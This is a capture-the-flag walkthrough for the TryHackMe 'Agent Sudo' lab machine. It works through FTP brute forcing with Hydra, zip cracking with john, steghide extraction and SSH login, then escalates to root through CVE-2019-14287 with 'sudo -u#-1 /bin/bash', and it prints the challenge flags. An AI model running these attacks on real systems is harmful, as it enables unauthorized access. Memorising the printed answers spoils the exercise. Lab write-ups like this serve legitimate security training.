# Agent Sudo

## Description

You found a secret server located under the deep sea. Your task is to hack inside the server and reveal the truth. 

## Task 2 - Enumerate

### 2.1 How many ports

*Hint: nmap*
~~~
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ef:1f:5d:04:d4:77:95:06:60:72:ec:f0:58:f2:cc:07 (RSA)
|   256 5e:02:d1:9a:c4:e7:43:06:62:c1:9e:25:84:8a:e7:ea (ECDSA)
|_  256 2d:00:5c:b9:fd:a8:c8:d8:80:e3:92:4f:8b:4f:18:e2 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Annoucement
~~~

Nmap reveals 3 ports

### 2.2 How you redirect yourself to a secret page?

*Hint: Answer format: xxxx-xxxxx*

When we connect to the main page, a message informs us to use our "codename" as user-agent:

~~~
$ curl -s http://10.10.56.93/ | html2text 
Dear agents,  
  
Use your own **codename** as user-agent to access the site.  
  
From,  
Agent R
~~~

We should change our `user-agent` to access the page.

### 2.3 What is the agent name?

*Hint: You might face problem on using Firefox. Try 'user agent switcher' plugin with user agent: C*

With User-agent set to `C`, we are redirected to `http://10.10.56.93/agent_C_attention.php`, where we can see the following message:

~~~
$ curl -A "C" -L http://10.10.56.93/
Attention chris, <br><br>

Do you still remember our deal? Please tell agent J about the stuff ASAP. Also, change your god damn password, is weak! <br><br>

From,<br>
Agent R 
~~~

Answer: `chris`

## [Task 3] Hash cracking and brute-force

### 3.1 FTP password

*Hint: Hail hydra!*

Let's crack chris' FTP account with Hydra:

~~~
$ hydra -l chris -P /data/src/wordlists/rockyou.txt 10.10.56.93 ftp
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-05-08 19:00:21
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344398 login tries (l:1/p:14344398), ~896525 tries per task
[DATA] attacking ftp://10.10.56.93:21/
[STATUS] 219.00 tries/min, 219 tries in 00:01h, 14344179 to do in 1091:39h, 16 active
[21][ftp] host: 10.10.56.93   login: chris   password: crystal
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-05-08 19:01:34
~~~

Now, let's connect with password `crystal` and get the files:

~~~
$ ftp 10.10.56.93
Connected to 10.10.56.93 (10.10.56.93).
220 (vsFTPd 3.0.3)
Name (10.10.56.93:unknown): chris
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
227 Entering Passive Mode (10.10.56.93,204,100).
150 Here comes the directory listing.
-rw-r--r--    1 0        0             217 Oct 29  2019 To_agentJ.txt
-rw-r--r--    1 0        0           33143 Oct 29  2019 cute-alien.jpg
-rw-r--r--    1 0        0           34842 Oct 29  2019 cutie.png
226 Directory send OK.
ftp> get To_agentJ.txt
local: To_agentJ.txt remote: To_agentJ.txt
227 Entering Passive Mode (10.10.56.93,38,234).
150 Opening BINARY mode data connection for To_agentJ.txt (217 bytes).
226 Transfer complete.
217 bytes received in 0.0552 secs (3.93 Kbytes/sec)
ftp> get cute-alien.jpg
local: cute-alien.jpg remote: cute-alien.jpg
227 Entering Passive Mode (10.10.56.93,217,163).
150 Opening BINARY mode data connection for cute-alien.jpg (33143 bytes).
226 Transfer complete.
33143 bytes received in 0.0604 secs (549.15 Kbytes/sec)
ftp> get cutie.png
local: cutie.png remote: cutie.png
227 Entering Passive Mode (10.10.56.93,72,247).
150 Opening BINARY mode data connection for cutie.png (34842 bytes).
226 Transfer complete.
34842 bytes received in 0.0625 secs (557.54 Kbytes/sec)
ftp> 221 Goodbye.
~~~

the `*.txt` file tells us something interesting about the pictures:

~~~
$ cat To_agentJ.txt 
Dear agent J,

All these alien like photos are fake! Agent R stored the real picture inside your directory. Your login password is somehow stored in the fake picture. It shouldn't be a problem for you.

From,
Agent C
~~~

### 3.2 Zip file password

*Hint: Mr.John*

We are told about a zip file but we don't have one. Let's use `binwalk` to see if the pictures contain embedded files.

~~~
$ binwalk -e cutie.png 

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             PNG image, 528 x 528, 8-bit colormap, non-interlaced
869           0x365           Zlib compressed data, best compression

WARNING: Extractor.execute failed to run external extractor 'jar xvf '%e'': [Errno 2] No such file or directory: 'jar', 'jar xvf '%e'' might not be installed correctly
34562         0x8702          Zip archive data, encrypted compressed size: 98, uncompressed size: 86, name: To_agentR.txt
34820         0x8804          End of Zip archive, footer length: 22
~~~

The `*.zip` file was embedded in `cutie.png`, but it's password protected. Let's use John the Ripper to brute force it:

~~~
$ zip2john 8702.zip > 8702.hash 
ver 81.9 8702.zip/To_agentR.txt is not encrypted, or stored with non-handled compression type
$ john 8702.hash --wordlist=rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (ZIP, WinZip [PBKDF2-SHA1 256/256 AVX2 8x])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
alien            (8702.zip/To_agentR.txt)
1g 0:00:00:00 DONE (2020-05-08 22:46) 2.272g/s 74472p/s 74472c/s 74472C/s chatty..dyesebel
Use the "--show" option to display all of the cracked passwords reliably
Session completed
~~~

Password: `alien`

### 3.3 steg password

Let's uncompress the zip file with the password found previously (`alien`):

~~~
$ 7z e 8702.zip 

7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,8 CPUs Intel(R) Core(TM) i7-4800MQ CPU @ 2.70GHz (306C3),ASM,AES-NI)

Scanning the drive for archives:
1 file, 280 bytes (1 KiB)

Extracting archive: 8702.zip
--
Path = 8702.zip
Type = zip
Physical Size = 280

    
Enter password (will not be echoed):
Everything is Ok    

Size:       86
Compressed: 280

$ cat To_agentR.txt 
Agent C,

We need to send the picture to 'QXJlYTUx' as soon as possible!

By,
Agent R
~~~

The string `QXJlYTUx` is base64 encoded. Let's decode it:

~~~
$ echo -n "QXJlYTUx" | base64 -d
Area51
~~~

### 3.4 Who is the other agent (in full name)?

Nothing has been done with the other picture (`cute-alien.jpg`) yet. Let's use steghide to see what hidden files may be embedded:

~~~
$ steghide --info cute-alien.jpg 
"cute-alien.jpg":
  format: jpeg
  capacity: 1.8 KB
Try to get information about embedded data ? (y/n) y
Enter passphrase: 
  embedded file "message.txt":
    size: 181.0 Byte
    encrypted: rijndael-128, cbc
    compressed: yes
~~~

Now that we know there is a text file embedded, let's extract it:

~~~
$ steghide --extract -sf cute-alien.jpg 
Enter passphrase: 
wrote extracted data to "message.txt".
$ cat message.txt 
Hi james,

Glad you find this message. Your login password is hackerrules!

Don't ask me why the password look cheesy, ask agent R who set this password for you.

Your buddy,
chris
~~~

The other agent is `james`

### 3.5 SSH password

The password is `hackerrules!`, as mentioned in the message found previously.

## [Task 4] Capture the user flag

### 4.1 What is the user flag?

The flag can be found in the `/home` directory.

~~~
$ sshpass -p "hackerrules!" ssh james@10.10.56.93 cat user_flag.txt
b03d975e8c92a7c04146cfa7a5a313c7
~~~

### 4.2 What is the incident of the photo called?

*Hint: Reverse image and Foxnews.*

The `/home` directory also contains a `*.jpg` file:

~~~
james@agent-sudo:~$ ls -l
total 48
-rw-r--r-- 1 james james 42189 Jun 19  2019 Alien_autospy.jpg
-rw-r--r-- 1 james james    33 Oct 29  2019 user_flag.txt
~~~

Let's download it:

~~~
$ scp -r james@10.10.56.93:Alien_autospy.jpg .
james@10.10.56.93's password: 
Alien_autospy.jpg                                        100%   41KB 174.4KB/s   00:00    
~~~

Using Google images reverse search, we can upload our picture and see what it finds. Filtering the results with "Fownews" quickly redirects us to this post: https://www.foxnews.com/science/filmmaker-reveals-how-he-faked-infamous-roswell-alien-autopsy-footage-in-a-london-apartment

Answer: `Roswell alien autopsy`

## [Task 5] Privilege escalation

### 5.1 CVE number for the escalation  (Format: CVE-xxxx-xxxx)

Googling for the terms `cve privileges escalation sudo` quickly points to `CVE-2019-14287`.

### 5.2 What is the root flag?

The `CVE-2019-14287` vulnerability is explained as follows:

*"A flaw was found in the way sudo implemented running commands with arbitrary user ID. If a sudoers entry is written to allow the attacker to run a command as any user except root, this flaw can be used by the attacker to bypass that restriction."*

This is exactly the case on the server:

~~~
$ sudo -l
[sudo] password for james: 
Matching Defaults entries for james on agent-sudo:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User james may run the following commands on agent-sudo:
    (ALL, !root) /bin/bash
~~~

Our user (`james`) can run `/bin/bash` as any user (`ALL`) except as root (`!root`). Let's exploit the vulnerability:

~~~
james@agent-sudo:~$ sudo -u#-1 /bin/bash
[sudo] password for james: 
root@agent-sudo:~# cat /root/root.txt
To Mr.hacker,

Congratulation on rooting this box. This box was designed for TryHackMe. Tips, always update your machine. 

Your flag is 
b53a02f55b57d4439e3341834d70c062

By,
DesKel a.k.a Agent R
~~~

### 5.3 (Bonus) Who is Agent R?

The message discloses the information:
~~~
DesKel a.k.a Agent R
~~~